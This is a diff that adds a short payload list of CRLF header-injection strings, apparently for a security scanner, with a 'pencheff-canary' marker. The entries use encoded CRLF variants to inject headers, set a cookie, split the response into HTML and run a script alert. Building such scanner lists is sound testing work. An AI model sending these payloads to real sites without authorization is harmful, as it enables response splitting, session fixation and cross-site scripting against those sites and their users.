@@ -1,0 +1,11 @@
+# Header Injection / CRLF Payloads
+%0d%0aInjected-Header:pencheff-canary
+%0aInjected-Header:pencheff-canary
+%0dInjected-Header:pencheff-canary
+%E5%98%8A%E5%98%8DInjected-Header:pencheff-canary
+\\r\\nInjected-Header:pencheff-canary
+%0d%0aSet-Cookie:pencheff=injected
+%0d%0a%0d%0a<html>pencheff-canary</html>
+%c0%8d%c0%8aInjected-Header:pencheff-canary
+%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0aX-Injected:%20true
